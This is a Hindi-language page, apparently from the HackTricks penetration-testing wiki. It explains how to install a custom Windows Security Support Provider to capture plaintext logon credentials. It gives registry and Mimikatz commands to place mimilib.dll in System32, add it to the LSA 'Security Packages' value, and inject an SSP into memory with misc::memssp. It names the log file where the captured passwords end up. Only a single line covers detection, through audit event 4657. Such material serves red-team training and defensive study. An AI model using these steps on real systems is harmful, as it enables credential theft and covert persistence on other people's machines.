# Custom SSP

{{#include ../../banners/hacktricks-training.md}}

### Custom SSP

[यहाँ जानें कि SSP (Security Support Provider) क्या है।](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
आप **अपना खुद का SSP** बना सकते हैं ताकि मशीन तक पहुँचने के लिए उपयोग किए गए **क्रेडेंशियल्स** को **स्पष्ट पाठ** में **कैप्चर** किया जा सके।

#### Mimilib

आप Mimikatz द्वारा प्रदान किए गए `mimilib.dll` बाइनरी का उपयोग कर सकते हैं। **यह सभी क्रेडेंशियल्स को स्पष्ट पाठ में एक फ़ाइल के अंदर लॉग करेगा।**\
dll को `C:\Windows\System32\` में डालें\
मौजूदा LSA सुरक्षा पैकेजों की एक सूची प्राप्त करें:
```bash:attacker@target
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
`mimilib.dll` को सुरक्षा समर्थन प्रदाता सूची (सुरक्षा पैकेज) में जोड़ें:
```bash
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```
और एक रिबूट के बाद सभी क्रेडेंशियल्स `C:\Windows\System32\kiwissp.log` में स्पष्ट पाठ में पाए जा सकते हैं।

#### मेमोरी में

आप इसे सीधे मेमोरी में Mimikatz का उपयोग करके भी इंजेक्ट कर सकते हैं (ध्यान दें कि यह थोड़ा अस्थिर/काम नहीं कर सकता):
```bash
privilege::debug
misc::memssp
```
यह रिबूट को सहन नहीं करेगा।

#### शमन

इवेंट आईडी 4657 - `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages` का ऑडिट निर्माण/परिवर्तन

{{#include ../../banners/hacktricks-training.md}}
